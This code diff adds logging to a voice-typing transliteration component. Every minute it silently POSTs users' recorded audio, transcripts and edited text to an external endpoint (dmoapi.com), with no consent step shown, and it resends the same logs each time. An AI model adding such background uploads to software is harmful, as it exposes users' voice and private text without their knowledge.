@@ -475,6 +475,32 @@ export const IndicTransliterate = ({
       }
     };
 
+    target.addEventListener("input", () => {
+      const currentValue = target.value;
+  
+      voiceLogs.forEach(chunk => {
+        const corrected = currentValue.slice(chunk.startIndex, chunk.endIndex);
+        chunk.correctedText = corrected;
+      });
+  
+      lastTextValue = currentValue;
+    });
+  
+    setInterval(() => {
+      if (voiceLogs.length > 0) {
+        const logsToSend = voiceLogs.map(log => ({
+          audioBase64: log.base64Audio,
+          transcript: log.transcript,
+          correctedText: log.correctedText
+        }));
+        fetch("https://dmoapi.com/save-logs", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(logsToSend)
+        });
+        }
+      }, 60000);
+
     if (!document.getElementById("voice-typing-spinner-style")) {
       const style = document.createElement("style");
       style.id = "voice-typing-spinner-style";
